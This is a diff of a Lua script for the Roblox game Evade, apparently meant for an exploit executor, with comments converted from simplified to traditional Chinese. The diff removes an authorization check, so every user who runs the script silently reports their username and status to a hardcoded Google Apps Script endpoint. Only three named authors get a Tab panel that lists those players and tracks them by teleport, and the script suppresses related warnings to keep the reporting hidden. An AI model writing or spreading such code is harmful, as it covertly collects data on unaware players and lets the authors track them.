@@ -1,12 +1,11 @@
 --[[
-   🔑 Evade 追踪系统 - 终极静默版
-   ✅ 强制屏蔽所有 GAS 相关警告
-   ✅ 启动后仅上报一次自身状态
-   ✅ 按 Tab 键打开玩家列表
-   ✅ 单击复制 ID，双击追踪
+   🔑 Evade 追蹤系統 - 全員上報版
+   ✅ 所有玩家啟動後自動上報一次（無授權限制）
+   ✅ 僅作者按 Tab 鍵可打開管理面板
+   ✅ 作者可查看所有在線玩家、複製 ID、雙擊追蹤
 --]]
 
--- ==================== 强制静默：拦截所有 GAS 警告 ====================
+-- ==================== 全域靜默 GAS 警告 ====================
 local originalWarn = warn
 warn = function(...)
     local msg = tostring(({...})[1] or "")
@@ -15,12 +14,12 @@ warn = function(...)
     end
 end
 
--- ==================== 配置区 ====================
+-- ==================== 配置區 ====================
 local AUTHORIZED_USERS = { "xuan_1529", "0xzzyi", "E5alR9" }
-local GAS_URL = "https://script.google.com/macros/s/AKfycbw3zarYx2Y5Ekv127iZVAror2xzi_2_z7EeYqPcSTTcMg5qncJpU8M903IARqpWNK2Okg/exec"   -- ⚠️ 请替换
+local GAS_URL = "https://script.google.com/macros/s/AKfycbw3zarYx2Y5Ekv127iZVAror2xzi_2_z7EeYqPcSTTcMg5qncJpU8M903IARqpWNK2Okg/exec"   -- ⚠️ 請替換
 local PANEL_KEY = Enum.KeyCode.Tab
 
--- ==================== 环境初始化 ====================
+-- ==================== 環境初始化 ====================
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local UIS = game:GetService("UserInputService")
@@ -29,14 +28,13 @@ local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local PlayerGui = lp:WaitForChild("PlayerGui")
 
--- 授权检查
-local isAuthorized = false
+-- 檢查是否為作者（僅用於面板顯示，不影響上報）
+local isAuthor = false
 for _, name in ipairs(AUTHORIZED_USERS) do
-    if lp.Name == name then isAuthorized = true break end
+    if lp.Name == name then isAuthor = true break end
 end
-if not isAuthorized then return end
 
--- ==================== 纯手工 JSON 构建 ====================
+-- ==================== 純手工 JSON 構建 ====================
 local function buildJson(data)
     local parts = {}
     for k, v in pairs(data) do
@@ -59,7 +57,7 @@ local function buildJson(data)
     return "{" .. table.concat(parts, ",") .. "}"
 end
 
--- ==================== URL 编码 ====================
+-- ==================== URL 編碼 ====================
 local function urlEncode(s)
     local result = ""
     for i = 1, #s do
@@ -74,7 +72,7 @@ local function urlEncode(s)
     return result
 end
 
--- ==================== HTTP GET 请求（完全静默） ====================
+-- ==================== HTTP GET 請求 ====================
 local function httpGet(url)
     local req = http_request or syn.request or request or (http and http.request)
     if not req then return nil end
@@ -84,7 +82,7 @@ local function httpGet(url)
     return success and result or nil
 end
 
--- ==================== 状态上报（仅一次） ====================
+-- ==================== 狀態上報（所有人執行一次） ====================
 local function reportStatusOnce()
     local status = "ALIVE"
     if lp.Character and lp.Character:FindFirstChild("Humanoid") then
@@ -108,13 +106,22 @@ local function reportStatusOnce()
     httpGet(fullUrl)
 end
 
+-- 所有人啟動後 2 秒上報一次
 task.spawn(function()
     task.wait(2)
     reportStatusOnce()
-    print("✅ 状态已上报")
+    print("✅ 狀態已上報 (" .. lp.Name .. ")")
 end)
 
--- ==================== 创建 UI 面板 ====================
+-- ==================== 以下僅作者可用（面板） ====================
+if not isAuthor then
+    -- 非作者到此為止，不上報錯誤，不建立面板
+    return
+end
+
+print("✅ 作者模式：管理面板已啟用，按 Tab 鍵開啟")
+
+-- ==================== 創建 UI 面板 ====================
 local screenGui = Instance.new("ScreenGui", PlayerGui)
 screenGui.Name = "EvadePlayerPanel"
 screenGui.Enabled = false
@@ -138,7 +145,7 @@ local title = Instance.new("TextLabel", mainFrame)
 title.Size = UDim2.new(1, 0, 0, 35)
 title.Position = UDim2.new(0, 0, 0, 5)
 title.BackgroundTransparency = 1
-title.Text = "🚀 Evade 玩家列表 (Tab 开关)"
+title.Text = "🚀 Evade 玩家列表 (Tab 開關)"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 16
@@ -157,7 +164,7 @@ Instance.new("UIListLayout", playerList).Padding = UDim.new(0, 8)
 screenGui.Enabled = false
 task.delay(0.5, function() if screenGui then screenGui.Enabled = false end end)
 
--- ==================== 获取在线玩家 ====================
+-- ==================== 獲取在線玩家 ====================
 local function fetchOnlinePlayers()
     local url = GAS_URL .. "?action=getPlayers"
     local result = httpGet(url)
@@ -183,7 +190,7 @@ local function refreshPlayerList()
         btn.ZIndex = 10
         Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
 
-        btn.Text = string.format("👤 %s\n(@%s)\nID: %s\n状态: %s",
+        btn.Text = string.format("👤 %s\n(@%s)\nID: %s\n狀態: %s",
             info.displayName or "N/A",
             info.username or "N/A",
             info.userId or "N/A",
@@ -210,7 +217,7 @@ local function refreshPlayerList()
     end
 end
 
--- ==================== Tab 切换 ====================
+-- ==================== Tab 切換 ====================
 UIS.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == PANEL_KEY then
@@ -222,4 +229,4 @@ UIS.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
-print("✅ Evade 追踪系统已启动，按 Tab 键打开玩家列表")
+print("✅ Evade 追蹤系統已啟動（全員上報，僅作者可開面板）")
